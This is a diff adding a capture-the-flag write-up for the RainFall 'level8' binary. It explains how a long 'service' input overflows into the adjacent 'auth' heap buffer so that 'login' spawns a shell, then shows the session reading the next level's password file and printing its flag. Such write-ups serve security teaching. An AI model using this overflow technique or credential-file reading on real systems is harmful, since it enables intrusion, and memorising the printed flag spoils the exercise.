@@ -1,0 +1,27 @@
+# after reading and analyzing the code (see source.c):
+# first is that there's an infinite loop, that makes it possible to enter more than one input in one run.
+# if input is 'auth ', then malloc is called and assigned to the global 'auth' pointer variable.
+# if input is 'service', then malloc is called and assigned to the global variable 'service' through 'strdup'
+# using ltrace or whatever, we can see that there are 16 bytes between the two heap allocated memories
+# for 'auth' and 'service'.
+# if input is 'login' and auth[32] isn't \0, a shell will execute...
+# since it's not possible to write to auth buffer until 32, we can take advantage of 'strcpy(service, buffer + 7);'
+# and overwrite until auth[32]
+# and in the next run, we simply have to enter 'login'.
+
+# Solution:
+
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018 
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+# note: first input is 'auth ' not 'auth'
+
